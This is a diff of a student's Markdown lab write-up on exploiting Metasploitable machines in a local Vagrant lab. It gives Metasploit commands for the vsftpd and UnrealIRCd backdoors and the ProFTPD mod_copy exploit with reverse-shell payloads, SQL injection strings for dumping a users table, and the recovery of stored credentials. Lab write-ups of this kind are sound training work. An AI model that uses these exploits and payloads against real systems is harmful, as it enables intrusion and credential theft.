@@ -100,23 +100,29 @@ Using the example from Mastering Metasploit to describe Cyber Kill Chain phases 
 - I accidently hacked Metasploitable3 first, but probably the same concepts work for Metasploitable2
 - I started by logging into Metasploit console and scanning the target
 
+    ```
     sudo msfdb init
     sudo msfconsole
     workspace -a h2-b
     db_nmap -Pn -sV 172.28.128.2
+    ```
 
 - Found FTP server running and wanted to try if that is vulnerable
 
+    ```
     search vsftp
     exploit/unix/ftp/vsftpd_234_backdoor
     exploit
+    ```
 
 - got root access, but wanted to try something else. I noticed the server was running UnrealIRCd, which was new service for me. I seached for an exploit and wanted to try, if it would work
 
+    ```
     search UnrealIRCd
     use exploit/unix/irc/unreal_ircd_3281_backdoor
     set payload cmd/unix/reverse
     exploit
+    ```
 
 - and again we got root really easily, which is quite scary
 
@@ -133,23 +139,33 @@ Using the example from Mastering Metasploit to describe Cyber Kill Chain phases 
 - I created development setup on Vagrant, which has Metasploitable3(172.28.128.3) and Kali(172.28.128.3) instances, see [tools](../tools/)
 - I logged into Kali machine and initiated the Metasploit database
 
+    ```
     sudo msfdb init
+    ```
 
 - Then logged into Metasploit console
 
+    ```
     sudo msfconsole
+    ```
 
 - created a workspace for me
 
+    ```
     workspace -a h2-b
+    ```
 
 - then I started poking the Metasploitable instance with NMAP
 
+    ```
     nmap -sV 172.28.128.3
+    ```
 
 - I noticed the open http port 80 and was curious about
 
+    ```
     nmap -sV 172.28.128.3 -p 80
+    ```
 
 - It tells me that the server is running Apache httpd 2.4.7.
 - Decided to take a look in the webpage by opening the http://172.28.128.3:80 in browser
@@ -158,35 +174,43 @@ Using the example from Mastering Metasploit to describe Cyber Kill Chain phases 
 - I got in with ' or 'a' = 'a user and pass combination. There were salaries of Star Wars characters, which was not that interesting, so decided to try and see, if I can get more information from the database
 - I queried all information from users table, and it got me all passwords and usernames
 
+    ```
     ' OR 1=1; select * from users#
+    ```
 
 - SSH to the machine worked with the first user and password combination I tried and the user had sudo, so I got root already
 - I wanted to try another approach, so I wanted to try the ftp server
 
+    ```
     search ProFTPD 1.3.5
+    ```
 
 - Found an excellent exploit for that and checked, that the service is vulnerable for that exploit
 
+    ```
     use exploit/unix/ftp/proftpd_modcopy_exec
     check
+    ```
 
 - Target was vulnerable so I needed to set options and run the exploit
 
+    ```
     show options
     set SITEPATH /var/www/html
     set payload cmd/unix/reverse_python
     exploit
+    ```
 
 - I got reverse shell in the system, but I wanted to upgrade the shell to Meterpreter
 
+    ```
     search shell_to_meterpreter
     use 0
     set LPORT 8080
     set SESSION 1
     exploit
     sessions 2
+    ```
 
 - now I had Meterpreter shell and working with the target was easier
 - I browsed the html directory and found phpmyadmin/config.inc.php, which contained credentials to phpmyadmin and they worked
-
----
